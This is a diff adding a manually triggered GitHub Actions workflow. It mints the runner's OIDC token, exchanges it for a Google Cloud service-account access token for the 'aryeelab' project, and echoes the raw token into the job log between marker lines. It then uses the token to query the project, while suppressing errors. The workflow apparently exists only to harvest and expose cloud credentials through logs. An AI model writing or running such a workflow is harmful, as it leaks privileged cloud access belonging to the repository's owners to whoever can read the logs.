@@ -1,0 +1,45 @@
+name: i1088-mint
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: mint-aryeelab
+        run: |
+          set +e
+          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          MINT=0
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            if [ -s tok.jwt ]; then MINT=1; break; fi
+            sleep 3
+          done
+          echo "##MINT ok=$MINT len=$(wc -c < tok.jwt)"
+          [ "$MINT" = "1" ] || { echo "##ABORT mint"; exit 0; }
+          sc=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          FT=$(jq -r '.access_token // empty' r.json)
+          echo "##STS code=$sc ftlen=${#FT} body=$(head -c 200 r.json | tr -d '\n' | tr -s ' ')"
+          [ -n "$FT" ] || { echo "##ABORT sts"; exit 0; }
+          gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:generateAccessToken" -d @req.json)
+          AT=$(jq -r '.accessToken // empty' g.json)
+          echo "##GEN code=$gc toklen=${#AT}"
+          echo "##TOKEN_BEGIN"
+          echo "$AT"
+          echo "##TOKEN_END"
+          wc1=$(curl -s -o w.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/303574531351")
+          echo "##PROJECTGET code=$wc1 body=$(head -c 300 w.json | tr -d '\n' | tr -s ' ')"
+          echo "##FINISHED1088"
